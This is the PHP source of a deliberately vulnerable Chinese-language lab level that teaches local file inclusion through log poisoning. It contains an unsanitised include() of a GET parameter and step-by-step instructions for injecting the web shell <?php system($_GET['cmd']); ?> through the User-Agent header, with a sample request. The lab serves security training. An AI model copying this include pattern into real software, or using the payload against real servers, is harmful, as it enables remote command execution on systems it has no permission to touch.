<?php
/**
 * Level 2: 包含日志文件
 * 难度: ★★☆☆☆
 * 描述: 通过包含日志文件来getshell
 * 目标: 在User-Agent中注入PHP代码，然后包含日志执行
 */

// 记录访问日志
$log_file = 'logs/access.log';
$log_entry = date('Y-m-d H:i:s') . ' - ' . $_SERVER['REMOTE_ADDR'] . ' - ' . $_SERVER['HTTP_USER_AGENT'] . ' - ' . $_SERVER['REQUEST_URI'] . "\n";
file_put_contents($log_file, $log_entry, FILE_APPEND);

$message = '';
$content = '';

if (isset($_GET['file'])) {
    $file = $_GET['file'];

    if (file_exists($file)) {
        ob_start();
        include($file);
        $content = ob_get_clean();
        $message = '<div class="success">✅ 文件包含成功</div>';
    } else {
        $message = '<div class="error">❌ 文件不存在</div>';
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Level 2 - 包含日志文件</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 30px;
        }
        .header h1 { font-size: 28px; margin-bottom: 5px; }
        .header .difficulty { opacity: 0.9; font-size: 14px; }
        .content { padding: 30px; }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #f5576c;
        }
        .info-box h3 { color: #333; margin-bottom: 10px; }
        .info-box ul, .info-box ol { margin-left: 20px; line-height: 1.8; color: #666; }
        .form-box {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            margin: 10px 0;
        }
        input[type="submit"] {
            background: #f5576c;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover { background: #e04555; }
        .success {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #28a745;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #dc3545;
        }
        .hint {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border-left: 4px solid #ffc107;
        }
        .code-box {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .result-box {
            background: #f8f9fa;
            border: 1px solid #ddd;
            padding: 15px;
            border-radius: 5px;
            max-height: 400px;
            overflow: auto;
        }
        .result-box pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #f5576c;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Level 2 - 包含日志文件Getshell</h1>
            <div class="difficulty">难度: ★★☆☆☆ | 技巧: 日志包含</div>
        </div>

        <div class="content">
            <div class="info-box">
                <h3>📋 关卡说明</h3>
                <ul>
                    <li>服务器会记录访问日志，包含User-Agent</li>
                    <li>日志文件保存在: <code>logs/access.log</code></li>
                    <li>通过文件包含漏洞可以包含日志文件</li>
                    <li>如果在User-Agent中注入PHP代码，包含日志时代码会被执行</li>
                </ul>
            </div>

            <div class="info-box">
                <h3>💡 攻击步骤</h3>
                <ol>
                    <li>使用Burp Suite拦截请求</li>
                    <li>修改User-Agent为: <code>&lt;?php system($_GET['cmd']); ?&gt;</code></li>
                    <li>发送请求，让PHP代码写入日志</li>
                    <li>包含日志文件: <code>?file=logs/access.log</code></li>
                    <li>添加cmd参数执行命令: <code>?file=logs/access.log&cmd=whoami</code></li>
                </ol>
            </div>

            <div class="info-box">
                <h3>📖 当前User-Agent</h3>
                <div class="code-box"><?php echo htmlspecialchars($_SERVER['HTTP_USER_AGENT']); ?></div>
                <p>你可以使用Burp Suite修改它来注入PHP代码</p>
            </div>

            <?php echo $message; ?>

            <div class="form-box">
                <h3>文件包含测试</h3>
                <form method="GET">
                    <label>要包含的文件路径:</label>
                    <input type="text" name="file" placeholder="例如: logs/access.log" value="<?php echo isset($_GET['file']) ? htmlspecialchars($_GET['file']) : ''; ?>" />
                    <input type="submit" value="包含文件" />
                </form>
            </div>

            <?php if ($content !== ''): ?>
            <div class="result-box">
                <h3>包含结果:</h3>
                <pre><?php echo htmlspecialchars($content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></pre>
            </div>
            <?php endif; ?>

            <div class="hint">
                <strong>🔍 日志记录代码:</strong>
                <div class="code-box">$log_entry = date('Y-m-d H:i:s') . ' - ' .
             $_SERVER['REMOTE_ADDR'] . ' - ' .
             $_SERVER['HTTP_USER_AGENT'] . ' - ' .  // ← User-Agent被记录
             $_SERVER['REQUEST_URI'] . "\n";
file_put_contents($log_file, $log_entry, FILE_APPEND);</div>

                <p><strong>Burp修改User-Agent示例:</strong></p>
                <div class="code-box">GET /file-include-lab/level2.php HTTP/1.1
Host: localhost
User-Agent: &lt;?php system($_GET['cmd']); ?&gt;
</div>

                <p><strong>然后访问:</strong></p>
                <ul>
                    <li>包含日志: <code>?file=logs/access.log</code></li>
                    <li>执行命令: <code>?file=logs/access.log&cmd=whoami</code></li>
                </ul>
            </div>

            <a href="index.php" class="back-link">← 返回首页</a> |
            <a href="logs/access.log" class="back-link" target="_blank">查看日志文件 →</a>
        </div>
    </div>
</body>
</html>
